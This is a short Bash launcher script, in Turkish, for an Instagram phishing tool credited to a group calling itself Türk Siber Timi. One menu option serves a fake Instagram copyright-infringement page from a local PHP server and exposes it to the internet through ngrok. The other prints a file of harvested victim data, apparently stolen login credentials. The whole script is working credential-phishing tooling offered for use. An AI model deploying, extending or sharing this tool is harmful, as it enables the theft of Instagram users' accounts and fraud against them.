#!/bin/bash|
#Code:Yaman Efkar
#Türk Siber Timi
#İnstagram : @turksibertimi
#Youtube : YamanEfkar

clear

echo -e '\033[32;40;1m
        /\︵-︵/\
        |( ◉)(◉)|
        \ ︶V︶ /
        /↺↺↺↺↺↺↺\
        ↺↺↺↺↺↺↺↺|
        \↺↺↺↺↺↺↺/
        ¯¯/\¯/\¯¯ '



echo -e "\033[31;40;1m
\033[31;40;1m[01]\e[37mİnstagram Fake Telif Hakkı 
\033[31;40;1m[02]\e[37mSaved"
echo -e "\033[32;40;1m                      ~~~Yaman Efkar~~~"
echo ""
read -p "İslem Numarası : " islem
if [[ $islem == 1 || $islem == 01 ]]; then
        read -p "Port Giriniz: " port
        echo -e "\e[32m"
	sleep 2
	echo ""
	echo -e "\e[33mPhp Server && Ngrok Service Başlatılıyor..."
	sleep 4
	cd Api/
ls
 php -S 127.0.0.1:$port > -t & ngrok http $port
elif [[ $islem == 2 || $islem == 02 ]]; then
        sleep 1
echo ""
echo -e "\e[33mVeriler Geliyor...."
sleep 2
echo -e "\e[37m"
cd Api/
cat tstadmin.txt
echo -e '\033[31;40;1m'
read -p "Ana Sayfaya Dönmek İçin Enter e Basınız...." xp
clear
sleep 2
cd ..
bash start.sh
else
	echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
	sleep 2
	clear
	bash start.sh
fi

